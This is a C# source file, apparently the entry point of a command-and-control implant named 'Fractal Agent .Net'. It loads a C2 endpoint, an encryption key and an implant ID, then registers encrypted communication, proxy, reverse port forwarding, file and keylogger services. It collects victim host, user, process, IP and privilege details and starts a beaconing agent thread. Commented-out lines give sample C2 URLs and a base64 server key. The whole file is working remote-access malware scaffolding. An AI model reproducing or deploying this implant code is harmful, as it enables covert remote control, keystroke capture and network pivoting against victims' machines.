using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Communication;
using Agent.Service;
using Shared;

namespace EntryPoint
{
    public class Entry
    {
#if DEBUG
        static string[] _args = new string[0];
#endif

        public static void Main(string[] args)
        {

//#if DEBUG
//            System.IO.File.AppendAllText(@"c:\users\olivier\log.txt", "starting!");
//#endif

#if DEBUG
            _args = args;
#endif
            try
            {
                Start().Wait();
            }
            catch (Exception ex)
            {
#if DEBUG
                Debug.WriteLine($"Ooops something went wrong : {ex}");
#endif
            }
        }

        public static async Task Start()
        {
            string connUrl = Agent.Properties.Resources.EndPoint;
            string serverKey = Agent.Properties.Resources.Key;
            string implantId = Agent.Properties.Resources.Implant;
#if DEBUG
            Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));

            //connUrl = "https://192.168.48.134:443";
            //connUrl = "http://192.168.48.134:2000";
            //connUrl = "pipe://127.0.0.1:Fractal";
            //connUrl = "http://127.0.0.1:2000";
            //connUrl = "tcp://*:4444";

            //connUrl = "https://127.0.0.1:3000";


            if (_args.Count() > 0)
            {
                connUrl = _args[0];
            }

            if (_args.Count() > 1)
            {
                serverKey = _args[1];
            }
            //else
            //{
            //    serverKey = "MXlPZEVWWGVmN2xqbnpyUg==";
            //}



#endif
            var connexion = ConnexionUrl.FromString(connUrl);

            Debug.WriteLine($"Endpoint is {connUrl}.");
            Debug.WriteLine($"ServerKey is {serverKey}.");
            Debug.WriteLine($"Implant is {implantId}.");

            if (!connexion.IsValid)
            {
                Debug.WriteLine($"Endpoint {connUrl} is not valid, quiting...");
                return;
            }

            var metaData = GenerateMetadata(connexion.ToString(), implantId);


            var configService = new ConfigService();
            configService.ServerKey = Convert.FromBase64String(serverKey);
            configService.EncryptFrames = true;

            ServiceProvider.RegisterSingleton<IConfigService>(configService);
            ServiceProvider.RegisterSingleton<INetworkService>(new NetworkService());
            ServiceProvider.RegisterSingleton<IFileService>(new FileService());
            ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
            var cryptoService = new CryptoService(configService);

            ServiceProvider.RegisterSingleton<ICryptoService>(cryptoService);
            var frameService = new FrameService(cryptoService, configService);
            ServiceProvider.RegisterSingleton<IFrameService>(frameService);
            ServiceProvider.RegisterSingleton<IJobService>(new JobService());
            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService(frameService));
            ServiceProvider.RegisterSingleton<IReversePortForwardService>(new ReversePortForwardService(frameService));

            ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());

            //ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());



            var commModule = CommunicationFactory.CreateCommunicator(connexion);

            try
            {



                var agent = new Agent.Agent(metaData, commModule);

#if DEBUG
            Debug.WriteLine($"AgentId is {metaData.Id}");
#endif


                var s_agentThread = new Thread(agent.Run);
                s_agentThread.Start();
                s_agentThread.Join();
            }
            catch(Exception ex)
            {
#if DEBUG
            Debug.WriteLine($"AgentId is {metaData.Id}");
#endif
            }




#if DEBUG
            Debug.WriteLine("Bye !");
#endif
        }


        static AgentMetadata GenerateMetadata(string endpoint, string implantId)
        {
            var hostname = Dns.GetHostName();
            var addresses = Dns.GetHostAddressesAsync(hostname).Result;

            var process = Process.GetCurrentProcess();
            var userName = Environment.UserName;

            var integrity = IntegrityLevel.Medium;
            if (userName == "SYSTEM")
                integrity = IntegrityLevel.System;

            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = IntegrityLevel.High;
                }
            }

            AgentMetadata metadata = new AgentMetadata()
            {
                Id = Agent.ShortGuid.NewGuid(),
                ImplantId = implantId,
                Hostname = hostname,
                UserName = userName,
                ProcessId = process.Id,
                Address = addresses.First(a => a.AddressFamily == AddressFamily.InterNetwork).GetAddressBytes(),
                ProcessName = process.ProcessName,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                Integrity = integrity,
                EndPoint = endpoint,
                Version = "Fractal Agent .Net" + " " + Assembly.GetExecutingAssembly().GetName().Version.ToString(),
                SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                SleepJitter = 0
            };

            return metadata;
        }
    }
}
